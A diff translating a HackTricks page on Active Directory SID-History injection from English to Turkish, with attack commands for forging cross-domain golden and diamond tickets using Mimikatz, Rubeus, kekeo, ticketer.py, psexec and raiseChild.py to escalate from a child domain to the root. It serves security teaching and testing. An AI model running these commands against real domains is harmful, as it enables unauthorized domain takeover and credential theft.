@@ -1,34 +1,32 @@
-# SID-History Injection
+# SID Geçmişi Enjeksiyonu
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT koleksiyonumuz**](https://opensea.io/collection/the-peass-family)
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** üzerinden PR göndererek paylaşın.
 
 </details>
 
-## SID History Injection Attack
+## SID Geçmişi Enjeksiyon Saldırısı
 
-The focus of the **SID History Injection Attack** is aiding **user migration between domains** while ensuring continued access to resources from the former domain. This is accomplished by **incorporating the user's previous Security Identifier (SID) into the SID History** of their new account. Notably, this process can be manipulated to grant unauthorized access by adding the SID of a high-privilege group (such as Enterprise Admins or Domain Admins) from the parent domain to the SID History. This exploitation confers access to all resources within the parent domain.
+**SID Geçmişi Enjeksiyon Saldırısı**nın odak noktası, **kullanıcıların alanlar arası göçü**ne yardımcı olurken eski alanlarındaki kaynaklara sürekli erişimi sağlamaktır. Bunun için kullanıcının yeni hesabının **SID Geçmişi**ne önceki Güvenlik Tanımlayıcısı'nı (SID) dahil etmek gerekmektedir. Özellikle, bu süreç, ebeveyn alanının yüksek ayrıcalıklı bir grubunun (örneğin Enterprise Admins veya Domain Admins) SID Geçmişi'ne eklendiğinde yetkisiz erişim sağlamak için manipüle edilebilir. Bu sömürü, ebeveyn alanındaki tüm kaynaklara erişim sağlar.
 
-Two methods exist for executing this attack: through the creation of either a **Golden Ticket** or a **Diamond Ticket**. 
+Bu saldırıyı gerçekleştirmek için iki yöntem bulunmaktadır: **Golden Ticket** veya **Diamond Ticket** oluşturarak.
 
-To pinpoint the SID for the **"Enterprise Admins"** group, one must first locate the SID of the root domain. Following the identification, the Enterprise Admins group SID can be constructed by appending `-519` to the root domain's SID. For instance, if the root domain SID is `S-1-5-21-280534878-1496970234-700767426`, the resulting SID for the "Enterprise Admins" group would be `S-1-5-21-280534878-1496970234-700767426-519`.
+"Enterprise Admins" grubunun SID'sini belirlemek için öncelikle kök alanın SID'sini bulmak gerekmektedir. Kimlik tespitinden sonra, Enterprise Admins grubunun SID'si, kök alanın SID'sine `-519` eklenerek oluşturulabilir. Örneğin, kök alanın SID'si `S-1-5-21-280534878-1496970234-700767426` ise, "Enterprise Admins" grubunun sonuçta oluşan SID'si `S-1-5-21-280534878-1496970234-700767426-519` olacaktır.
 
-You could also use the **Domain Admins** groups, which ends in **512**.
+Ayrıca **Domain Admins** gruplarını da kullanabilirsiniz, bunlar **512** ile biter.
 
-Another way yo find the SID of a group of the other domain (for example "Domain Admins") is with:
-
+Diğer alanın bir grubunun SID'sini (örneğin "Domain Admins") bulmanın başka bir yolu da:
 ```powershell
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
-
-### Golden Ticket (Mimikatz) with KRBTGT-AES256
+### KRBTGT-AES256 ile Golden Ticket (Mimikatz)
 
 {% code overflow="wrap" %}
 ```bash
@@ -49,13 +47,13 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 ```
 {% endcode %}
 
-For more info about golden tickets check:
+Daha fazla bilgi için altın biletler hakkında kontrol edin:
 
 {% content-ref url="golden-ticket.md" %}
 [golden-ticket.md](golden-ticket.md)
 {% endcontent-ref %}
 
-### Diamond Ticket (Rubeus + KRBTGT-AES256)
+### Elmas Bilet (Rubeus + KRBTGT-AES256)
 
 {% code overflow="wrap" %}
 ```powershell
@@ -69,7 +67,7 @@ Rubeus.exe golden /rc4:<krbtgt hash> /domain:<child_domain> /sid:<child_domain_s
 ```
 {% endcode %}
 
-For more info about diamond tickets check:
+Daha fazla bilgi için elmas biletler hakkında kontrol edin:
 
 {% content-ref url="diamond-ticket.md" %}
 [diamond-ticket.md](diamond-ticket.md)
@@ -77,13 +75,13 @@ For more info about diamond tickets check:
 
 {% code overflow="wrap" %}
 ```bash
-.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local 
+.\asktgs.exe C:\AD\Tools\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
 {% endcode %}
 
-Escalate to DA of root or Enterprise admin using the KRBTGT hash of the compromised domain:
+Kompromize edilen etki alanının KRBTGT özeti kullanarak kök veya Kurumsal yöneticiye yükseltin:
 
 {% code overflow="wrap" %}
 ```bash
@@ -99,17 +97,15 @@ schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
 {% endcode %}
 
-With the acquired permissions from the attack you can execute for example a DCSync attack in the new domain:
+Saldırıdan elde edilen izinlerle, örneğin yeni etki alanında bir DCSync saldırısı gerçekleştirebilirsiniz:
 
 {% content-ref url="dcsync.md" %}
 [dcsync.md](dcsync.md)
 {% endcontent-ref %}
 
-### From linux
+### Linux üzerinden
 
-#### Manual with [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py)
-
-{% code overflow="wrap" %}
+#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) ile manuel olarak
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -124,45 +120,43 @@ ticketer.py -nthash <krbtgt_hash> -domain <child_domain> -domain-sid <child_doma
 # JUST USE THE SAME USERNAME IN THE NEXT STEPS
 
 # Load ticket
-export KRB5CCNAME=hacker.ccache 
+export KRB5CCNAME=hacker.ccache
 
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
 {% endcode %}
 
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### Otomatik olarak [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) kullanarak
 
-This is an Impacket script which will **automate escalating from child to parent domain**. The script needs:
+Bu, çocuk alanından ana alana yükselme işlemini otomatikleştiren bir Impacket betiğidir. Betik aşağıdakileri gerektirir:
 
-* Target domain controller
-* Creds for an admin user in the child domain
+* Hedef etki alanı denetleyicisi
+* Çocuk alanında bir yönetici kullanıcısı için kimlik bilgileri
 
-The flow is:
+Akış şu şekildedir:
 
-* Obtains the SID for the Enterprise Admins group of the parent domain
-* Retrieves the hash for the KRBTGT account in the child domain
-* Creates a Golden Ticket
-* Logs into the parent domain
-* Retrieves credentials for the Administrator account in the parent domain
-* If the `target-exec` switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
-
+* Ana alanın Enterprise Yöneticileri grubunun SID'sini alır
+* Çocuk alanındaki KRBTGT hesabının hash'ini alır
+* Bir Golden Ticket oluşturur
+* Ana alana giriş yapar
+* Ana alanın Yönetici hesabının kimlik bilgilerini alır
+* `target-exec` anahtarı belirtilmişse, ana alanın Etki Alanı Denetleyicisine Psexec aracılığıyla kimlik doğrular.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-
-## References
+## Referanslar
 * [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
 * [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Bir **cybersecurity şirketinde** çalışıyor musunuz? **Şirketinizi HackTricks'te reklamını yapmak** ister misiniz? veya **PEASS'ın en son sürümüne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
+* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family), özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu keşfedin
+* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter**'da takip edin 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Hacking hilelerinizi [hacktricks repo](https://github.com/carlospolop/hacktricks) ve [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)'ya PR göndererek paylaşın**.
 
 </details>
